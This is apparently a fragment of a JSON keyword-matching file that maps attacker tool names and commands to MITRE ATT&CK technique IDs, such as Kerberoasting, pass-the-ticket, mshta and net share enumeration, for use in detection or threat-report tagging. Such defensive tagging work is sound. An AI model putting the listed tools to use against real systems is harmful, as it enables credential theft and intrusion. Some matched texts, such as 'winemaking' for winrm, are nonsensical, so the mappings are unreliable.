    " C:\\Windows\\System32\\utilman.exe": [],
    "collect + keychain in same sentence": [],
    "mshta": [],
    "mshta.exe": [],
    "pass-the-ticket": [
        {
            "tec_id": "T1550.003",
            "en_text": "pass-the-ticket",
            "data_text": "a ticket-passer"
        }
    ],
    "Invoke-Kerberoast ": [],
    "looks for net and account or domain in close proximity ": [],
    " net accounts ": [
        {
            "tec_id": "T1201",
            "en_text": " net accounts ",
            "data_text": "net accounts"
        }
    ],
    " Get-PassPol": [],
    "cron": [],
    "winrm": [
        {
            "tec_id": "T1021.006",
            "en_text": "winrm",
            "data_text": "winemaking"
        }
    ],
    "BITSadmin  ": [],
    "spwebmember ": [],
    "LC_LOAD_DYLIB ": [],
    "HISTCONTROL": [],
    "NinjaCopy": [],
    "regasm.exe ": [],
    " regsvcs.exe": [
        {
            "tec_id": "T1218.009",
            "en_text": " regsvcs.exe",
            "data_text": "regsh.exe"
        }
    ],
    "MS14-068": [],
    "sudo": [],
    "InstallUtil.exe": [],
    "net view ": [
        {
            "tec_id": "T1135",
            "en_text": "net view ",
            "data_text": "clean-looking"
        }
    ],
    " net share": [
        {
            "tec_id": "T1135",
            "en_text": " net share",
            "data_text": "net share"
        }
    ],
    "reg query": [
        {
            "tec_id": "T1012",
            "en_text": "reg query",
            "data_text": "Request reg"
        }
    ],
    "netstat ": [
        {
            "tec_id": "T1049",
            "en_text": "netstat ",
            "data_text": "netstat"
        }
    ],
    " net use ": [
        {
            "tec_id": "T1049",
            "en_text": " net use ",
            "data_text": "a net need"
        }
    ],
    " net session": [],
    "capture webcam data ": [
        {
            "tec_id": "T1125",
            "en_text": "capture webcam data ",
            "data_text": "webcam data capture"
        }
    ]
}